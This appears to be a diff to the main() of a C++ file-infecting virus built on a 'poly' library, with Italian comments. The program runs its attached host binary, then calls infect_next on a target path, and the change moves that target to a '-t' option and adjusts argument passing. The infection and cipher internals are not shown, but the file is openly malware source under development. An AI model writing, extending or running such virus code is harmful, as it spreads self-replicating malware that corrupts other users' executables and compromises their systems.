@@ -5,6 +5,8 @@
 #include <poly/host_properties.hpp>
 #include <poly/virus.hpp>
 
+int arg_pass_from = 1;
+
 // Assumo che il valore restituito rappresenti un path valido che punti a un
 // file
 struct TargetSelectPolicy {
@@ -18,7 +20,7 @@ struct BlockingExec {
               char **const envp) noexcept {
         std::string cmd = program.string();
 
-        for (auto i = 2; i < argc; i++) {
+        for (auto i = arg_pass_from; i < argc; i++) {
             cmd += " " + std::string(argv[i]);
         }
 
@@ -42,14 +44,12 @@ using Cipher = poly::Cipher<
 
 int main(int argc, char **argv, char **envp) {
     if (argc < 2) {
-        std::cerr << "Usage: " << argv[0] << " <target_path> [<args..>]\n";
-        std::cerr << "Required:\n";
-        std::cerr << "\ttarget_path: this represents the path where the binary "
-                     "to infect is placed. If is empty it will be ignored.\n";
-        std::cerr << "\nOptional:\n";
-        std::cerr
-            << "\targs..: other arguments which will be passed to the attached "
-               "binary, if present.\n";
+        std::cerr << "Usage: " << argv[0] << " [options] [<args..>]\n";
+        std::cerr << "OPTIONS:\n";
+        std::cerr << "\t-t <target_path>\tPath where the binary to infect is "
+                     "placed.\n";
+        std::cerr << "\tOther arguments will be passed to the attached "
+                     "binary, if present.\n";
 
         return 1;
     }
@@ -61,6 +61,12 @@ int main(int argc, char **argv, char **envp) {
         return 1;
     }
 
+    std::string target = "";
+    if (std::string(argv[1]) == "-t") {
+        arg_pass_from += 2;
+        target = std::string(argv[2]);
+    }
+
     auto res = virus->exec_attached_program();
     bool has_attached_bin = res == poly::Error::kNone;
 
@@ -68,8 +74,8 @@ int main(int argc, char **argv, char **envp) {
         return 1;
     }
 
-    if (!std::string(argv[1]).empty() &&
-        virus->infect_next(argv[1]) != poly::Error::kNone) {
+    if (!std::string(target).empty() &&
+        virus->infect_next(target) != poly::Error::kNone) {
         return 1;
     }
     virus->wait_exec_end();
